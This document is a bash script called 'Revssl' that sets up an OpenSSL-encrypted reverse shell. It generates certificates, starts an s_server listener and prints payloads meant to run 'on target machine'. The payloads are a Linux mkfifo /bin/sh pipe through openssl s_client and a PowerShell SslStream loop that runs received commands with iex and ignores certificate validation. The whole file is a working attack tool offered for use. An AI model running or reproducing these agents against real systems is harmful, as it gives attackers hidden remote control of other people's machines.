#!/bin/bash

# Colores
red=$(tput setaf 1)
green=$(tput setaf 2)
yellow=$(tput setaf 3)
blue=$(tput setaf 4)
magenta=$(tput setaf 5)
grey=$(tput setaf 8)
reset=$(tput sgr0)
bold=$(tput bold)
underline=$(tput smul)

l="${red}<*>${reset}"

print_good() {
    echo "${green}[+]${reset} $1"
}

print_error() {
    echo "${red}[x]${reset} $1"
}

print_info() {
    echo "[*] $1"
}

listener=0
agent_file=0
remove_certs=0
encryption="rsa:4096"
lport=443
lhost=$(ip address | awk '/inet / && !/127.0.0.1/{gsub(/\/.*/, "", $2); print $2}')
key_name="key.pem"
cert_name="cert.pem"
platform="linux"
domain="domain.xyz"
agent_file_name="openssl_revshell"

print_usage() {
    cat <<EOF
                _
               | |
 _ __ _____   _| |_ ___ _ __
| '__/ _ \ \ / / __/ _ \ '__|
| | |  __/\ V /| ||  __/ |
|_|  \___| \_/  \__\___|_|
Revssl ver. 1.0
Created by: HAME-RU $l

usage: revssl [-h] [-i] [-e <encryption>] [-d <days>] [-l <lhost>]
              [-p <lport>] [-k <keyname>] [-c <certname>] [-p <platform>]
              [-o] [-n <outfile>] [-s <domain>]

options:
  -h        Show help message
  -i        Initiate listener in OpenSSL
  -e <encryption>
            Choose encryption type (default: $encryption)
  -d <days> Set certificates lifetime
  -l <lhost>
            Set listening host (default: $lhost)
  -p <port> Set listening port (default: $lport)
  -k <keyname>
            Set name of generated key file (default: $key_name)
  -c <certname>
            Set name of generated cert file (default: $cert_name)
  -a <platform>
            Select agent platform (windows or linux, default: $platform)
  -s <domain>
            Domain name for Windows Powershell agent (default: $domain)
  -o        Write agent to a file
  -n <outfile>
            Select name of the agent file (default: $agent_file_name)
  -r        Remove generated certificates after OpenSSH server is running
EOF
}

while getopts "hie:d:l:p:k:c:a:ons:r" opt; do
    case "$opt" in
        h)
            print_usage
            exit 0
            ;;
        i)
            listener=1
            ;;
        e)
            encryption=$OPTARG
            ;;
        d)
            days=$OPTARG
            ;;
        l)
            lhost=$OPTARG
            ;;
        p)
            lport=$OPTARG
            ;;
        k)
            key_name=$OPTARG
            ;;
        c)
            cert_name=$OPTARG
            ;;
        a)
            platform=$OPTARG
            ;;
        o)
            agent_file=1
            ;;
        n)
            agent_file_name=$OPTARG
            ;;
        r)
            remove_certs=1
            ;;
        *)
            print_usage
            exit 1
            ;;
    esac
done

gen_cert_cmd="openssl req -x509 -newkey $encryption -keyout $key_name -out $cert_name -days $days -nodes"
listener_cmd="openssl s_server -quiet -key $key_name -cert $cert_name -port $lport"

linux_agent="mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect $lhost:$lport > /tmp/s; rm /tmp/s"

read -r -d '' windows_agent <<EOL
\$socket = New-Object Net.Sockets.TcpClient('$lhost', $lport)
\$stream = \$socket.GetStream()
\$sslStream = New-Object System.Net.Security.SslStream(\$stream,\$false,({\$True} -as [Net.Security.RemoteCertificateValidationCallback]))
\$sslStream.AuthenticateAsClient('$domain')
\$writer = new-object System.IO.StreamWriter(\$sslStream)
\$writer.Write('PS ' + (pwd).Path + '> ')
\$writer.flush()
[byte[]]\$bytes = 0..65535|%{0};
while ((\$i = \$sslStream.Read(\$bytes, 0, \$bytes.Length)) -ne 0) {
    \$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes, 0, \$i)
    \$sendback = (iex \$data | Out-String) 2>&1
    \$sendback2 = \$sendback + 'PS ' + (pwd).Path + '> '
    \$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2)
    \$sslStream.Write(\$sendbyte, 0, \$sendbyte.Length)
    \$sslStream.Flush()
}
EOL

$gen_cert_cmd
echo
print_info "Generated certificates"

if [ "$platform" = "linux" ]; then
    agent=$linux_agent
else
    agent=$windows_agent
fi

print_info "Generated agent for $platform (execute it on target machine):"
echo "$agent"
echo

remove_certs() {
    sleep 10
    if [ $remove_certs -eq 1 ]; then
        rm "$cert_name" "$key_name"
        print_info "Removed keys and certificates"
    fi
}

remove_certs &

if [ $agent_file -eq 1 ]; then
    echo "$agent" > "$agent_file_name"
    print_info "Saved agent to $bold$agent_file_name$reset"
fi

if [ $listener -eq 1 ]; then
    print_good "Started listener on port $lport"
    $listener_cmd
fi
